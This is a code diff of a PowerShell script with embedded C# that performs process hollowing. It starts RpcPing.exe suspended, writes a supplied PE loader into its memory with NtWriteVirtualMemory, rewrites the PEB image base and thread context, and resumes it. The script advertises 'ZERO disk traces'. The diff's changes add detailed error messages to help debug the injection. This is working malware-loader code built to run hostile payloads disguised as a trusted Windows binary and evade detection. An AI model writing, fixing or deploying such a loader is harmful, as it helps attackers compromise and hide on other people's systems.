@@ -166,29 +166,29 @@ public class ProcessHollowing {
     const uint PAGE_EXECUTE_READWRITE = 0x40;
     const uint CONTEXT_FULL = 0x10007;
 
-    public static bool HollowProcess(byte[] peBytes, string targetProcess) {
+    public static string HollowProcess(byte[] peBytes, string targetProcess) {
         IntPtr hProcess = IntPtr.Zero;
         IntPtr hThread = IntPtr.Zero;
         
         try {
             // Parse PE headers
             if (peBytes.Length < 64) {
-                return false;
+                return "Error: PE file too small";
             }
             
             int e_lfanew = BitConverter.ToInt32(peBytes, 60);
             if (e_lfanew >= peBytes.Length || e_lfanew < 0) {
-                return false;
+                return "Error: Invalid e_lfanew";
             }
             
             // Check DOS signature
             if (BitConverter.ToUInt16(peBytes, 0) != 0x5A4D) {
-                return false; // MZ
+                return "Error: Invalid DOS signature (not MZ)";
             }
             
             // Check PE signature
             if (BitConverter.ToUInt32(peBytes, e_lfanew) != 0x00004550) {
-                return false; // PE\0\0
+                return "Error: Invalid PE signature";
             }
             
             // Get ImageBase and SizeOfImage (check if PE32 or PE32+)
@@ -214,7 +214,7 @@ public class ProcessHollowing {
                 sizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
                 entryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
             } else {
-                return false; // Unknown PE format
+                return "Error: Unknown PE format (not PE32 or PE32+)";
             }
             
             // Create suspended process
@@ -225,7 +225,7 @@ public class ProcessHollowing {
             if (!CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, 
                 CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi)) {
                 int error = Marshal.GetLastWin32Error();
-                return false;
+                return "Error: CreateProcess failed (code: " + error + ")";
             }
             
             hProcess = pi.hProcess;
@@ -236,8 +236,9 @@ public class ProcessHollowing {
                 CONTEXT ctx = new CONTEXT();
                 ctx.ContextFlags = CONTEXT_FULL;
                 if (!GetThreadContext(pi.hThread, ref ctx)) {
+                    int error = Marshal.GetLastWin32Error();
                     TerminateProcess(pi.hProcess, 1);
-                    return false;
+                    return "Error: GetThreadContext failed (code: " + error + ")";
                 }
                 
                 // Read PEB to get base address (x64: Rdx + 16, which is sizeof(SIZE_T) * 2)
@@ -250,7 +251,7 @@ public class ProcessHollowing {
                 if (status != 0 || bytesRead != 8) {
                     Marshal.FreeHGlobal(baseAddressPtr);
                     TerminateProcess(pi.hProcess, 1);
-                    return false;
+                    return "Error: NtReadVirtualMemory failed (status: 0x" + status.ToString("X") + ", bytes: " + bytesRead + ")";
                 }
                 
                 IntPtr baseAddress = Marshal.ReadIntPtr(baseAddressPtr);
@@ -272,8 +273,9 @@ public class ProcessHollowing {
                 }
                 
                 if (mem == IntPtr.Zero) {
+                    int error = Marshal.GetLastWin32Error();
                     TerminateProcess(pi.hProcess, 1);
-                    return false;
+                    return "Error: VirtualAllocEx failed (code: " + error + ")";
                 }
                 
                 // Write PE headers using NtWriteVirtualMemory (like the C++ code)
@@ -289,7 +291,7 @@ public class ProcessHollowing {
                 status = NtWriteVirtualMemory(pi.hProcess, mem, headerBytes, (uint)sizeOfHeaders, out bytesWritten);
                 if (status != 0) {
                     TerminateProcess(pi.hProcess, 1);
-                    return false;
+                    return "Error: NtWriteVirtualMemory (headers) failed (status: 0x" + status.ToString("X") + ")";
                 }
                 
                 // Write sections
@@ -328,14 +330,14 @@ public class ProcessHollowing {
                 status = NtWriteVirtualMemory(pi.hProcess, pebImageBase, imageBaseBytes, 8, out bytesWritten);
                 if (status != 0) {
                     TerminateProcess(pi.hProcess, 1);
-                    return false;
+                    return "Error: NtWriteVirtualMemory (PEB) failed (status: 0x" + status.ToString("X") + ")";
                 }
                 
                 // Set thread context using NtSetContextThread (like C++ code)
                 status = NtSetContextThread(pi.hThread, ref ctx);
                 if (status != 0) {
                     TerminateProcess(pi.hProcess, 1);
-                    return false;
+                    return "Error: NtSetContextThread failed (status: 0x" + status.ToString("X") + ")";
                 }
                 
                 // Resume thread using NtResumeThread (like C++ code)
@@ -343,23 +345,23 @@ public class ProcessHollowing {
                 status = NtResumeThread(pi.hThread, out suspendCount);
                 if (status != 0) {
                     TerminateProcess(pi.hProcess, 1);
-                    return false;
+                    return "Error: NtResumeThread failed (status: 0x" + status.ToString("X") + ")";
                 }
                 
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
                 
-                return true;
+                return "Success";
             }
-            catch {
-                TerminateProcess(pi.hProcess, 1);
-                CloseHandle(pi.hThread);
-                CloseHandle(pi.hProcess);
-                return false;
+            catch (Exception ex) {
+                if (hProcess != IntPtr.Zero) TerminateProcess(hProcess, 1);
+                if (hThread != IntPtr.Zero) CloseHandle(hThread);
+                if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
+                return "Error: Exception - " + ex.Message;
             }
         }
-        catch {
-            return false;
+        catch (Exception ex) {
+            return "Error: Outer exception - " + ex.Message;
         }
     }
 }
@@ -394,12 +396,12 @@ if ($null -ne $loaderBytes -and $loaderBytes.Length -gt 0) {
     $targetProcess = "C:\Windows\System32\RpcPing.exe"
     $result = [ProcessHollowing]::HollowProcess($loaderBytes, $targetProcess)
     
-    if ($result) {
+    if ($result -eq "Success") {
         Write-Host " OK" -ForegroundColor Green
         Write-Host "Loader executed successfully - ZERO disk traces!" -ForegroundColor Green
     } else {
         Write-Host " FAILED" -ForegroundColor Red
-        Write-Host "Error: Process hollowing failed. Check if RpcPing.exe exists and you have proper permissions." -ForegroundColor Yellow
+        Write-Host $result -ForegroundColor Yellow
     }
 } else {
     Write-Host " FAILED" -ForegroundColor Red
